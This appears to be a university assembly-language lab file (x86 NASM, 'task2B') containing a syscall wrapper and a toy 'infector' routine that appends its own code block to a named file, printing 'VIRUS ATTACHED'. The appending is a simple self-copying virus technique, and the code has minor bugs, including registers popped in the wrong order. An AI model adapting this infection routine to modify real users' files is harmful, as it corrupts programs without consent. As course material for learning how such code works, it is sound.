section .data
    str2: db " VIRUS ATTACHED", 0x0A
    len2 equ $ - str2
section .rodata
    thisFile: db "start.s"
    str: db "Hello, Infected File ", 0x0A
    len equ $ - str
    
section .bss
    fileLocation: resd 1
    buffer_size: resd 1
    buffer:resb 100
section .text
global _start,code_start,code_end
global system_call,infection,infector,print_new_line,print_attach


extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

;//////////////////task2B////////////////////////////////

code_start:
print_attach:
    push ebp
    mov eax, 4          ; sys_write
    mov ebx, 1          ; stdout
    mov ecx, str2        ; string
    mov edx, len2        ; string size
    int 0x80
    pop ebp
    ret


infection:
    push ebp
    mov eax, 4          ; sys_write
    mov ebx, 1          ; stdout
    mov ecx, str        ; string
    mov edx, len        ; string size
    int 0x80
    pop ebp
    ret

infector:
    push ebx
    push ecx
    push edx
    

    ;open the file we want to change
        mov eax, 5              ; sys_open
        mov ebx, [esp+16]    ; save file name
        mov ecx, 1024|1            ; flags (read write)
        mov edx, 0644            ; 
        int 0x80
        mov [fileLocation], eax
   
   ;write to file
        mov eax, 4 ; syscall number for write
        mov ebx, [fileLocation] ; file descriptor
        mov ecx, code_start ; pointer to data, first time not working to change to buffer with str and then switch(?)
        mov edx, code_end-code_start ; size of data
        int 0x80 ; call the kernel

    ;close file
        mov eax, 6 ; syscall number for close
        mov ebx, [fileLocation] ; file descriptor
        int 0x80 ; call the kernel

    pop ebx
    pop ecx
    pop edx
    ret
                    
    
code_end:

